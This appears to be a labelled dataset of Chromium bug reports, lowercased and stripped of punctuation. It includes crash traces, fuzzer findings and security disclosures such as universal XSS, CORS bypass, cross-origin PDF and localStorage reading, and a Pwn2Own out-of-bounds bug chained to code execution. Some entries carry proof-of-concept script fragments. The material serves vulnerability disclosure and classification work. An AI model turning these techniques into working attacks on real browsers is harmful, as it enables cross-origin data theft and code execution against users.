content/child/child_thread_impl.cc:510:10 32 in content renderthreadimpl send ipc message content/renderer/render_thread_impl.cc:859:13 33 in content renderwidget send ipc message content/renderer/render_widget.cc:754:10 34 in content renderframeimpl runjavascriptmessage content javascriptmessagetype std 1 basic_string unsigned short base string16_char_traits std 1 allocator unsigned short const std 1 basic_string unsigned short base string16_char_traits std 1 allocator unsigned short const gurl const std 1 basic_string unsigned short base string16_char_traits std 1 allocator unsigned short content/renderer/render_frame_impl.cc:1721:3 35 in content renderframeimpl runmodalalertdialog blink webstring const content/renderer/render_frame_impl.cc:2968:3 36 in blink chromeclientimpl openjavascriptalertdelegate blink localframe wtf string const third_party/webkit/source/web/chromeclientimpl.cpp:418:9 37 in bool blink openjavascriptdialog blink chromeclient bool blink chromeclient blink localframe wtf string const blink localframe wtf string const blink chromeclient dialogtype third_party/webkit/source/core/page/chromeclient.cpp:95:19 previously allocated by thread t0 chrome here 0 in operator new unsigned long 0:0 1 in blink weblocalframeimpl printbegin blink webprintparams const blink webnode const third_party/webkit/source/web/weblocalframeimpl.cpp:1389:45 2 in printing prepareframeandviewforprint prepareframeandviewforprint printmsg_print_params const blink weblocalframe blink webnode const bool components/printing/renderer/print_web_view_helper.cc:650:5 3 in printing printwebviewhelper prepareframeforpreviewdocument components/printing/renderer/print_web_view_helper.cc:1100:30 4 in printing printwebviewhelper onprintpreview base dictionaryvalue const components/printing/renderer/print_web_view_helper.cc:1081:3 5 in dispatchtomethodimpl printing printwebviewhelper void printing printwebviewhelper const base dictionaryvalue base dictionaryvalue 0 base/tuple.h:254:3 6 in dispatchtomethod printing printwebviewhelper void printing printwebviewhelper const base dictionaryvalue base dictionaryvalue base/tuple.h:261:0 7 in dispatch printing printwebviewhelper printing printwebviewhelper void void printing printwebviewhelper const base dictionaryvalue components/printing/common/print_messages.h:343:0 8 in printing printwebviewhelper onmessagereceived ipc message const components/printing/renderer/print_web_view_helper.cc:894:0 9 in content renderviewimpl onmessagereceived ipc message const content/renderer/render_view_impl.cc:1289:9 10 in content messagerouter routemessage ipc message const content/common/message_router.cc:54:3 11 in content messagerouter onmessagereceived ipc message const content/common/message_router.cc:46:10 12 in content childthreadimpl onmessagereceived ipc message const content/child/child_thread_impl.cc:612:10 13 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:294:3 14 in run base/callback.h:396:12 15 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 16 in scheduler taskqueuemanager processtaskfromworkqueue unsigned long bool base pendingtask components/scheduler/child/task_queue_manager.cc:690:5 17 in scheduler taskqueuemanager dowork bool components/scheduler/child/task_queue_manager.cc:643:9 18 in run base/callback.h:396:12 19 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 20 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:458:3 21 in deferorrunpendingtask base/message_loop/message_loop.cc:468:5 22 in base messageloop dowork base/message_loop/message_loop.cc:580:0 23 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:34:21 24 in base runloop run base/run_loop.cc:55:3 25 in base messageloop run base/message_loop/message_loop.cc:286:3 26 in content renderermain content mainfunctionparams const content/renderer/renderer_main.cc:220:7 27 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:307:14 28 in content contentmainrunnerimpl run content/app/content_main_runner.cc:802:12 29 in content contentmain content contentmainparams const content/app/content_main.cc:19:15 30 in chromemain chrome/app/chrome_main.cc:66:12 31 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 summary addresssanitizer heap-use-after-free home/chamal/chrome/src/out/release/chrome shadow bytes around the buggy address fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb	11
security completely spoofable origin including lock sign this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details	11
security webrequest api allows intercepting xhr from apps and extensions vulnerability details webrequest api allows extensions to intercept and redirect requests from the browser that includes requests from other extensions however it also allows to intercept xmlhttprequest requests from chrome apps which is quite possibly unintended chrome apps are supposed to be as much independent from the browser as possible note that webview contained content is not affected nor are xhr requests from inside webviews scenario 1 a victim app is using https-secured communication to an external api 2 the user installs an extension with broad permissions in the browser not expecting it to affect the app 3 extension is able to intercept requests reading/modifying request and response headers reading the request body and is able to redirect or disrupt the requests arbitrarily version chrome version 43.0.2357.132 64-bit stable on ubuntu 14.04 chrome version 46.0.2457.0 64-bit canary on windows 8.1 reproduction case poc code is attached the victim app is querying from its own code with xhr also embeds it in a webview and queries it again from inside the webview the interceptor extension intercepts all requests to that url and redirects them to a local file instead 1 install app from the archive 2a open in the browser 2b launch the app and click make request button results as expected browser status ok xhr from app status ok embedded webview status ok xhr injected into webview status ok 3 install extension from the archive 4a open in the browser 4b re-launch the app click make request button results browser status intercepted expected xhr from app status intercepted not expected embedded webview status ok expected xhr injected into webview status ok expected	2
security chrome.runtime.setuninstallurl does not validate its url parameter chrome.runtime.setuninstallurl only checks whether the given parameter is a syntactically valid url but it does not enforce the blacklist of disallowed urls this allows extensions and apps without requiring any install permissions to open any url including special chrome urls in the worst case this bug could be used to exploit a memory bug in the browser process e.g uaf in a browser thread upon shutdown i ve attached a proof of concept upon start-up it will set the uninstall url and uninstall itself that will immediately close the browser	2
potential uaf at webcore timerbase setnextfiretime useragent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/37.0.2062.120 safari/537.36 steps to reproduce the problem 1 launch chromium 2 enter a url occurring tab crash in omnibox and go to website for example 3 wait for a few seconds until the page loaded completely 4 a tab will crash see aw snap if tab crash is not observed you may need to scroll or hover over the web contents what is the expected behavior a tab wo n't crash what went wrong aw snap error is always reproduced every time additional information about the issue can be reproduced by both debug and release build can be reproduced since chromium 37 can not be reproduced by 64-bit build can not be reproduced by official build google chrome if i blocked javascript or used adblock extensions the issue become not be reproduced some chromium derivative products like srware iron and chromiumportable based on chromium 37 have become to reproduce the issue crashed report id n/a i use chromium not google chrome how much crashed just one tab is it a problem with a plugin no did this work before no chrome version 37.0.2062.120 developer build channel stable os version windows 7 flash version i built the chromium with normally format and tested the console of windbg says eax=77c22e65 ebx=77c22e00 ecx=00000000 edx=00000000 esi=0167a8f8 edi=00000000 eip=77bf015d esp=0449fdb4 ebp=0449ff48 iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246 ntdll ntwaitformultipleobjects 77bf015d 83c404 add esp,4 3:057 g 2444.15f4 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled warning unable to verify checksum for c cygwin\home\chromium\src\out\release\chrome_child.dll eax=800ac52e ebx=4147f4bb ecx=2ec51900 edx=20b08380 esi=2ec51900 edi=2ec51900 eip=0f719fc8 esp=002df7f8 ebp=002df80c iopl=0 nv up ei pl nz ac po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210212 chrome_child webcore timerbase setnextfiretime 0f719fc8 8b4008 mov eax dword ptr eax+8 ds:002b:800ac536 4:066 g 2444.15f4 access violation code c0000005 second chance eax=800ac52e ebx=4147f4bb ecx=2ec51900 edx=20b08380 esi=2ec51900 edi=2ec51900 eip=0f719fc8 esp=002df7f8 ebp=002df80c iopl=0 nv up ei pl nz ac po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210212 chrome_child webcore timerbase setnextfiretime 0f719fc8 8b4008 mov eax dword ptr eax+8 ds:002b:800ac536 resource viewer highlights the line double newtime alignedfiretime newunalignedtime	11
security performance apis reveal cross-origin urls vulnerability details it is possible to read x-domain urls after a redirect if the page can be iframed what i think is a violation of the sop and could be used to steal sensitive data from several pages if redirects to an attacker can iframe the first page and obtain the secret of the second one the exploit abuses what seems a bug in performance.getentries when dealing with cached pages version chrome version version 43.0.2357.134 64-bit stable it also affects ff and ie operating system any i have created a simple poc with a brief explanation in the following url the code is also attached thought it will not work from file regards	2
security cross-site read access to pdf files the out-of-process viewer exposes an api when its mime-type is set to application/x-google-chrome-pdf presumably to support the print preview among the supported api is a method to select all text and get the contents of the selection this allows any web page to read the contents of a pdf file from any source i have attached a proof of concept 1 open the page 2 input the url of a pdf file i ve used the bitcoin paper as an example 3 click on the show content button 4 the contens of the pdf will be displayed in the pdf this can be fully automated websites could scan for popular urls and automatically read the contents of a pdf the only defence for users is to disable plugin loading by default there are three settings run all plugin content detect and run important plugin content and let me choose when to run plugin content only the last option protects users from this exploit	9
security universal xss using stack overflow exceptions vulnerability details when the maximum call stack size is exceeded a rangeerror object is created using isolate s current context thus if a cross-origin context had been entered through the v8wrapperinstantiationscope constructor for example a cross-origin exception will be propagated to the catch handler version chrome 45.0.2454.85 stable chrome 46.0.2490.22 beta chrome 47.0.2503.0 dev chromium 47.0.2507.0 release build compiled today reproduction case script var i document.documentelement.appendchild document.createelement iframe function g var w frames 0 function f try f catch e try w.location catch e o e f o.constructor.constructor alert location function c try frames 0 a catch e clearinterval s g var s setinterval c 1 i.src script	9
security universal xss using exceptions thrown from object.observe vulnerability details from v8/src/object-observe.js function objectobserve object callback acceptlist var objectobservefn getobjectcontextobjectobserve object return objectobservefn object callback acceptlist from v8/src/runtime/runtime-observe.cc runtime_function runtime_getobjectcontextobjectobserve handle context context object getcreationcontext isolate return context native_object_observe objectobservefn is derived from the observed object s creation context potentially cross-origin when this function is invoked any subsequent exceptions will be created in the aforementioned context and they ll propagated to a try-catch handler version chrome 45.0.2454.85 stable chrome 46.0.2490.22 beta chrome 47.0.2503.0 dev chromium 47.0.2510.0 release build compiled today reproduction case script var i document.documentelement.appendchild document.createelement iframe i.onload function try object.observe frames 0 location map 0 catch e e.constructor.constructor alert location i.src script	2
security intra-object-overflow in third_party/pdfium/core/src/fpdfapi/fpdf_cmaps/fpdf_cmaps.cpp vulnerability details intra-object-overflow in pdfium a struct is defined like this in third_party/pdfium/core/src/fpdfapi/fpdf_font/font_int.h class cpdf_fontglobals public cfx_object public struct const fx_word m_pmap int m_count m_embeddedtounicodes 5 fx_lpbyte m_pcontrastramps third_party/pdfium/core/src/fpdfapi/fpdf_cmaps/fpdf_cmaps.cpp void fpdfapi_loadcid2unicodemap int charset const fx_word pmap fx_dword count cpdf_fontglobals pfontglobals cpdf_modulemgr get getpagemodule getfontglobals pmap pfontglobals m_embeddedtounicodes charset m_pmap count pfontglobals m_embeddedtounicodes charset m_count with the attached file the value of charset is 5 i.e it overflows the buffer inside the object although it is still inside the same heap-allocated chunk this was detected by running pdfium_test with a new mode of asan not yet available in llvm trunk see 14286==error addresssanitizer intra-object-overflow on address at pc bp sp read of size 4 at thread t0 0 in fpdfapi_loadcid2unicodemap int unsigned short const unsigned int third_party/pdfium/core/src/fpdfapi/fpdf_cmaps/fpdf_cmaps.cpp:182:5 1 in cpdf_cid2unicodemap load cpdf_cmapmanager int int third_party/pdfium/core/src/fpdfapi/fpdf_font/fpdf_font_cid.cpp:794:5 2 in loadcid2unicodemap third_party/pdfium/core/src/fpdfapi/fpdf_font/fpdf_font_cid.cpp:138:5 3 in getcid2unicodemap third_party/pdfium/core/src/fpdfapi/fpdf_font/fpdf_font_cid.cpp:127 4 in cpdf_cidfont load third_party/pdfium/core/src/fpdfapi/fpdf_font/fpdf_font_cid.cpp:1050 5 in cpdf_font load third_party/pdfium/core/src/fpdfapi/fpdf_font/fpdf_font.cpp:494:12 6 in cpdf_font createfontf cpdf_document cpdf_dictionary third_party/pdfium/core/src/fpdfapi/fpdf_font/fpdf_font.cpp:478:10 7 in cpdf_docpagedata getfont cpdf_dictionary int third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_doc.cpp:287:24 8 in cpdf_streamcontentparser findfont cfx_bytestring const third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:1310:24 9 in cpdf_streamcontentparser handle_setfont third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:1270:24 10 in cpdf_streamcontentparser onoperator char const third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:380:13 11 in cpdf_streamcontentparser parse unsigned char const unsigned int unsigned int third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:52:21 12 in cpdf_contentparser continue ifx_pause third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:1082:36 13 in continueparse third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:704:5 14 in cpdf_page parsecontent cpdf_parseoptions int third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:906 15 in fpdf_loadpage third_party/pdfium/fpdfsdk/src/fpdfview.cpp:371:2 16 in renderpdf char const char const unsigned long outputformat third_party/pdfium/samples/pdfium_test.cc:310:22 17 in main third_party/pdfium/samples/pdfium_test.cc:406:7 18 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 19 in start usr/local/google/home/kcc/chromium/src/out/release/pdfium_test is located 328 bytes inside of 688-byte region allocated by thread t0 here 0 in interceptor_malloc usr/local/google/home/kcc/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:40:3 1 in operator new third_party/pdfium/core/src/fpdfapi/fpdf_page include/fpdfapi fxcrt/fx_memory.h:40:16 2 in cpdf_modulemgr initpagemodule third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_doc.cpp:65 3 in fpdf_initlibrary third_party/pdfium/fpdfsdk/src/fpdfview.cpp:149:2 4 in main third_party/pdfium/samples/pdfium_test.cc:380:3 5 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 version fresh chromium trunk on linux git revision e48457c33ad890f8b55f0eeeb36b21050950977d	7
tracking bug for internal fixes chrome m40 release 0 critical high medium low	7
tracking bug for internal fixes chrome m40 release 0 critical high medium low	7
heap-buffer-overflow in grbufferallocpool putback detailed report fuzzer inferno_canvas_wrecker job type mac_asan_chrome crash type heap-buffer-overflow read 4 crash address crash state grbufferallocpool putback grinorderdrawbuffer releasereservedvertexspace grdrawtarget autoreleasegeometry reset regressed minimized testcase 0.53 kb filer inferno	7
use-of-uninitialized-value in skcolortypevalidatealphatype detailed report fuzzer kkania_chromebot job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state skcolortypevalidatealphatype skbitmap setalphatype blink imageframe operator minimized testcase 0.08 kb download html meta http-equiv refresh content 0 url html filer inferno	11
tracking bug for internal fixes chrome m40 release 0 critical high medium low	11
media permission not displayed in pageinfo version chrome canary 41.0.2218.0 os android l repro 1 go to 2 on load accept the location prompt 3 click the page and then accept the camera prompt expected pageinfo shows location permission pageinfo shows camera permission actual pageinfo shows location permission pageinfo does not show camera permission	2
security nacl processes should have an address space usage limit address space usage limits are helpful against various classes of security bugs heap sprays can be contained various classes of kernel bugs to rely on pressuring the address space or on controlling page table allocations renderers already implement this mechanism and nacl should have some limit as well on 64 bits processes	2
security file origins can use webkitrequestfullscreen and requestpointerlock without a prompt looks like a file origins can just enter full screen without displaying the always allow exit fullscreen prompt a this page is now fullscreen prompt appears for a short while and then slides out of the screen if the page can synthesize or just hang on a user gesture for a long time it can enter fullscreen without the user noticing reproduction case attached	2
tracking bug for internal fixes chrome m44 release 0 high medium low	11
no stack detailed report fuzzer mbarbella_js_mutation job type linux_asan_d8_dbg crash type unknown crash address crash state null regressed v8 r27257:27344 minimized testcase 2.48 kb filer machenbach	11
tracking bug for internal fixes chrome m45 release 0 high medium low	11
use-of-uninitialized-value in blink transformationmatrix blend detailed report fuzzer dstockwell-anim-gen job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state blink transformationmatrix blend blink interpolatedtransformoperation apply blink layoutstyle applytransform minimized testcase 2.90 kb filer inferno	11
hosted apps running in windows do n't show the origin what steps will reproduce the problem 1 install this app 2 make it open in a window 3 browse around and wonder where you are what is the expected output what do you see instead the origin should be visible when the app is no longer at the same origin as the app that was installed felt i guessted the severity of this is there some standard for determining it	11
tracking bug for internal fixes chrome m45 release 0 high medium low	11
security universal xss via containernode parserinsertbefore vulnerability details from webkit/source/core/dom/containernode.cpp void containernode parserinsertbefore passrefptrwillberawptr node newchild node nextchild while refptrwillberawptr containernode parent newchild parentnode parent parserremovechild newchild if document newchild document document adoptnode newchild.get assert_no_exception eventdispatchforbiddenscope assertnoeventdispatch scriptforbiddenscope forbidscript treescope adoptifneeded newchild insertbeforecommon nextchild newchild newchild updateancestorconnectedsubframecountforinsertion childlistmutationscope this childadded newchild notifynodeinserted newchild childrenchangesourceparser parserremovechild can run script and it can remove nextchild from dom or move the node around when this happens the tree will be in an inconsistent state after the insertbeforecommon call allowing an attacker to bypass the frame restrictions version chrome 44.0.2403.130 stable chrome 45.0.2454.26 beta chrome 46.0.2471.2 dev chromium 46.0.2480.0 release build compiled today	11
heap-use-after-free in content embeddedworkerinstance releaseprocess detailed report fuzzer therealholden_worker job type windows_asan_content_shell platform id windows crash type heap-use-after-free read 4 crash address crash state content embeddedworkerinstance releaseprocess content embeddedworkerinstance sendstartworker base internal runnableadapter void unminimized testcase additional requirements requires http filer inferno see for more information	11
unknown in cmaplookupcallback detailed report fuzzer ochang_neurofuzz_borgfuzz job type linux_asan_pdfium platform id linux crash type unknown crash address crash state cmaplookupcallback cfx_basesegmentedarray iterateindex cfx_basesegmentedarray iterate regressed minimized testcase 54.00 kb filer mbarbella	7
security localstorage of file can be read from any remote origin through a blob document with the origin of null vulnerability details the data in localstorage of file can be stolen from any remote origin through blob documents the detailed way to steal is written below version chrome version 44.0.2403.107 stable operating system windows 8 pro osx yosemite 10.10.4 reproduction case step 1 as a preparation store data to the localstorage of file origin i.e local files 1-1 open then the prepare.html is started to download automatically 1-2 open the downloeded prepare.html this file stores token=12345678 in your localstorage of file origin 1-3 open the developer tools and check token=12345678 is set to the file origin in local storage list step 2 let s steal the token stored above 2-1 open and click the link on the page 2-2 the alert dialog is shown with 12345678 it s read from the localstorage of file origin note that if you can not reproduce the issue please try clearing all history data or change to new user of chrome this exploit code is sometimes unstable in detail the page opened at step 2-1 is a data document that encodes following html with base64 body script var text u003cscript\u003ealert localstorage.getitem token u003c/script\u003e var blob new blob text type text/html var url url.createobjecturl blob window.top.location url script body chrome opens above document as an unique origin since it has data scheme so the origin of the blob url created in above document also has an the origin of null like this blob null/3df393c1-9cd1-45d5-8ed4-1e9146a2f4a9 chrome prohibits to access localstorage from data if you read it from data url directly then the following error is shown uncaught securityerror failed to read the localstorage property from window storage is disabled inside data urls but chrome allows to read localstorage from blob document that is generated by data document the blob document generated above has null origin so it can read the localstorage of only but at the first time of read of the data in origin it seems chrome copies all localstorage data from file to origin so the blob document can read the token storead in file as data of	5
security memory-safety bug in image11 map i reported the following bug to mozilla for its manifestations in firefox thunderbird etc at since the bug is in angle a google library i am also reporting it here i found the bug via code inspection in angle v.2422 from the readme.chromium file in the angle root folder which appears in mozilla codebase 39.0 the discussion below pertains to that version of the mozilla codebase except that i have updated the line numbers to correspond to the latest available angle in which the bug appears still to be present github.com/google/angle/blob/master/src/libangle/renderer/d3d/d3d11/image11.cpp image11 map gfx\angle\src\libglesv2\renderer\d3d\d3d11\image11.cpp does not properly report error status if its call to devicecontext map fails due to a device lost error instead it returns gl_no_error this can cause a caller to use an uninitialized d3d11_mapped_subresource object one such caller is image11 loaddata which uses an uninitialized d3d11_mapped_subresource to determine where to copy the data specified by its input argument this can cause loaddata to overwrite an arbitrary and possibly quite large block of memory with data from input the bug is at line 639 which should be followed by something like return result 614 gl error image11 map d3d11_map maptype d3d11_mapped_subresource map map is not initialized 634 hresult result devicecontext map stagingtexture subresourceindex maptype 0 map 635 636 this can fail if the device is removed from tdr 637 if d3d11 isdevicelosterror result 638 639 mrenderer notifydevicelost 640 641 else if failed result 642 643 return gl error gl_out_of_memory failed to map staging texture result 0x x result 644 645 646 mdirty true 647 648 return gl error gl_no_error 649 the bug is activated by e.g loaddata 257 d3d11_mapped_subresource mappedimage 258 gl error error map d3d11_map_write mappedimage 259 if error.iserror 260 261 return error 262 263 264 uint8_t offsetmappeddata reinterpret_cast uint8_t mappedimage.pdata yoffset mappedimage.rowpitch xoffset outputpixelsize zoffset mappedimage.depthpitch 265 loadfunction area.width area.height area.depth 266 reinterpret_cast const uint8_t input inputrowpitch inputdepthpitch 267 offsetmappeddata mappedimage.rowpitch mappedimage.depthpitch 268 269 unmap 270 271 return gl error gl_no_error 272 mappedimage is neither explicitly nor implicitly initialized before line 258 passes it to map line 264 then uses it to compute the destination address for a copy operation and line 265 calls loadfunction to do the copy which it does without testing for the error status set by map at line 639 i have verified the above for the version of angle included in mozilla s 39.0 codebase by using the debugger to to skip line 634 and force isdevicelosterror on line 637 to return true additionally unmap on line 269 probably does something bad if line 608 fails it also appears that the following other callers in image11.cpp are affected by the same bug image11 loadcompresseddata image11 copy image11 generatemipmap	7
global-buffer-overflow at vp56_rac_get_prob_branchy useragent mozilla/5.0 x11 linux x86_64 rv:31.0 gecko/20100101 firefox/31.0 iceweasel/31.3.0 steps to reproduce the problem 1 chrome-asan ch-segv-unknown-renorm.webm what is the expected behavior what went wrong asan spots an error did this work before n/a chrome version 42.0.2273.0 developer build channel dev os version 3.2.0-4-amd64 flash version opening the movie seems to cause one of two different traces one with random looking addresses which does n't sound good 30219==addresssanitizer while reporting a bug found another one ignoring 30219==error addresssanitizer segv on unknown address pc bp sp t73 0 in vp56_rac_renorm mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavcodec/vp56.h:229 1 in vp78_decode_mb_row_sliced mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavcodec/vp8.c:2479 2 in worker mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavcodec/pthread_slice.c:100 3 in start_thread 0 22767==error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 1 at thread t9 0 in vp56_rac_get_prob_branchy mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavcodec/vp56.h:228 1 in vp78_decode_mb_row_sliced mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavcodec/vp8.c:2479 2 in worker mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/ffmpeg/libavcodec/pthread_slice.c:100 3 in start_thread 0	7
unknown in vp8_read_mv_component useragent mozilla/5.0 windows nt 6.1 applewebkit/537.36 khtml like gecko chrome/45.0.2454.93 safari/537.36 example url steps to reproduce the problem 1 open repro.webm what is the expected behavior what went wrong render crash did this work before n/a is it a problem with flash or html5 n/a does this work in other browsers n/a chrome version 47.0.2511.0 channel canary os version 6.1 windows 7 windows server 2008 r2 flash version shockwave flash 18.0 r0 i could n't repro this crash under asan windows stack traces thread 10 crashed exception_access_violation_read magic signature thread chrome_child.dll vp8.c:802 vp8_read_mv_component chrome_child.dll vp8.c:2396 vp8_decode_mb_row_no_filter chrome_child.dll vp8.c:2509 vp8_decode_mb_row_sliced chrome_child.dll pthread_slice.c:100 worker chrome_child.dll w32pthreads.h:79 win32thread_worker chrome_child.dll threadex.c:376 callthreadstartex chrome_child.dll threadex.c:354 threadstartex kernel32.dll basethreadinitthunk ntdll.dll rtluserthreadstart ntdll.dll rtluserthreadstart	7
security css font loading api bypasses cors vulnerability details cross-origin restriction for css font loading api can be bypasses with 308 redirector in same origin of the document version chrome version 43.0.2357.134 stable operating system windows 7 professional service pack 1 reproduction case 1 at first the expected behavior here is as the following url this document tries to load a cross-origin font like this var f new fontface newfont url but the loading error is shown on the console because the font does n't send an access-control-allow-origin header 2 but the flaw i found is the following this document also loads same font as 1 but it s through 308 redirector like this var f new fontface newfont url http.php s=308 u then the font can be loaded with bypassing cors restriction and the font is successfully applied to the document	2
security pwn2own mobile case out-of-bound access in json stringifier vulnerability details the vulnerable code is at basicjsonstringifier serializejsarray basicjsonstringifier result basicjsonstringifier serializejsarray handle jsarray object handlescope handle_scope isolate result stack_push stackpush object if stack_push success return stack_push uint32_t length 0 check object length toarraylength length initialized length here builder_.appendcharacter switch object getelementskind case fast_smi_elements handle fixedarray elements fixedarray cast object elements isolate for uint32_t i 0 i length i if i 0 builder_.appendcharacter serializesmi smi cast elements get i break case fast_double_elements empty array is fixedarray but not fixeddoublearray if length 0 break handle fixeddoublearray elements fixeddoublearray cast object elements isolate for uint32_t i 0 i length i if i 0 builder_.appendcharacter serializedouble elements get_scalar i break case fast_elements handle fixedarray elements fixedarray cast object elements isolate for uint32_t i 0 i length i iterate the array here but the length can be modified while iterating because there is javascript callbacks such as tojson if i 0 builder_.appendcharacter result result serializeelement isolate handle object elements get i isolate element get i will serialize out-of-bound elements i if result success continue if result unchanged builder_.appendcstring null else return result break todo yangguo the fast_holey cases could be handled in a faster way they resemble the non-holey cases except that a prototype chain lookup is necessary for holes default result result serializejsarrayslow object length if result success return result break builder_.appendcharacter stackpop return success chrome version 46.0.2490.76 stabe to exploit this bug we can fake a jsarraybuffer object in the out-of-bound memory when serializeelement handle this faked arraybuffer we can get a javascript object when code is called back to javascript by tojson how to install an app without user interaction 1.get remote code execution with this bug 2.need a google account signed in the nexus devices convert the rce to a uxss and inject javascript code into play.google.com to execute the full exploit is attached as a.html you can test it with the latest chrome in a nexus 6 device the rce2uxss code is attached as service.cpp i inline hooked function executescript to append some javascript	11
security appcacheupdatejob uaf appcacheupdatejob urlfetcher has a raw job pointer to appcacheupdatejob a fetcher that outlives job causes uaf one check that keeps a job alive is in appcacheupdatejob maybecompleteupdate master_entries_completed pending_master_entries_.size a new master request is initiated at appcacheupdatejob startupdate which inserts the master url into pending_master_entries if that s the first encounter of this master url a new request is initated at appcacheupdatejob addmasterentrytofetchlist the master url is considered to be a first encounter when it has n't been fetched yet it is n't currently being fetched and it is n't scheduled to be fetched addmasterentrytofetchlist checks whether the url has been fetched by calling appcache getentry this returns an existing entry if one has been set by appcache addormodifyentry in appcacheupdatejob handlemasterentryfetchcompleted if a master url request returns a 404 though the completion is counted in master_entries_completed but a cache entry is not created so if another master is added with the same url this seems like a first encounter and a new request is started as the second request finishes master_entries_completed is incremented again for the same url but this url in only inserted once in the pending_master_entries this allows an attacker to get master_entries_completed pending_master_entries_.size while a request is actually still ongoing the job is deleted and the fetcher will access it leading to uaf crashes the browser without requiring a compromised renderer working on a fix chrome version 46 stable and up operating system all reproduction case unpack appcache_poc.tar.gz run webserver and navigate to	11
security appcacheupdatejob accesses map end appcachehost destructor notifies any pending cache update jobs by calling appcacheupdatejob ondestructionimminent which does content/browser/appcache/appcache_update_job.cc:1104 pendingmasters iterator found pending_master_entries_.find host pending_master_entry_url dcheck found pending_master_entries_.end pendinghosts hosts found second it does n't expect the new_master_entry_url of the host to change since job creation this url can change with a compromised renderer though and a browser crash occurs the renderer can send appcachehostmsg_markasforeignentry which reaches appcachehost finishcacheselection content/browser/appcache/appcache_host.cc:428 new_master_entry_url gurl as a fix markasforeignentry should probably be disallowed after cache has been selected chrome version 48.0.2547.0 dev operating system all reproduction case unpack appcache_poc.tar.gz apply poc.patch and do a release build run webserver and navigate to	11
security appcachedispatcherhost uaf with host transfer appcachedispatcherhost contains an appcachebackendimpl which keeps a map of appcachehosts a host can have a pending callback with a raw pointer to the dispatcher if the dispatcher dies it deletes all of its hosts so that any pending callbacks are deleted but there is an exception hosts can be transferred from an old backend to a new one which does n't clear any pending callbacks such a case leads to a uaf in the browser process if the old backend is deleted before a callback fires the transfer is done by appcachebackendimpl transferhostout and transferhostin and the possible pending callbacks are defined in content/browser/appcache/appcache_host.h:301 pending_get_status_callback pending_start_update_callback and pending_swap_cache_callback chrome version 46 stable and up operating system all reproduction case unpack appcache_poc.tar.gz apply poc.patch and do a release build run webserver and navigate to	11
security universal xss via persistence of subframes vulnerability details from third_party/webkit/source/core/dom/document.cpp bool frameloader prepareforcommit pluginscriptforbiddenscope forbidplugindestructorscripting refptrwillberawptr documentloader pdl m_provisionaldocumentloader if m_documentloader client dispatchwillclose dispatchunloadevent m_frame detachchildren the previous calls to dispatchunloadevent and detachchildren can execute arbitrary script via things like unload events if the executed script intiates a new load or causes the current frame to be detached we need to abandon the current load if pdl m_provisionaldocumentloader return false if m_frame document m_frame document detach m_documentloader m_provisionaldocumentloader.release m_frame updateframesecurityorigin return true this logic depends on the assumption that dispatching the unload event will advance the navigated document s loadeventprogress state to unloadeventhandled such that creation of subframes will be suppressed the frame s document may change through synchronous loads though normally this is okay because the load will detach the provisional loader from the frame and the pdl m_provisionaldocumentloader check will catch this however if the replacement occurs through loading a javascript uri during a page dismissal event which suppresses detaching loaders the provisional loader will remain attached as a result an attacker will be able to attach subframes that will persist in the frame tree of a cross-origin document version chrome 46.0.2490.86 stable chrome 47.0.2526.58 beta chrome 48.0.2560.0 dev 